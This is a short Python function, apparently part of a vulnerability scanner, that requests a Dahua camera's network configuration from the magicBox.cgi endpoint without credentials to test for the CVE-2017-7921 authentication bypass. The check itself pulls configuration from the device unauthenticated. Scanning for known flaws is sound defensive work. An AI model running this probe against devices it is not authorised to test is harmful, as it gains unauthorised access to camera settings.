import requests

def check(ip, port=80):
    schemes = ['http', 'https'] if port in [443, 8443, 9443] else ['http']
    for scheme in schemes:
        url = f"{scheme}://{ip}:{port}/cgi-bin/magicBox.cgi?action=getConfig&name=Network"
        try:
            r = requests.get(url, timeout=5, verify=False)
            if r.status_code == 200 and "Network" in r.text:
                return True, "Dahua Auth Bypass (CVE-2017-7921) possible"
        except Exception:
            continue
    return False, ""
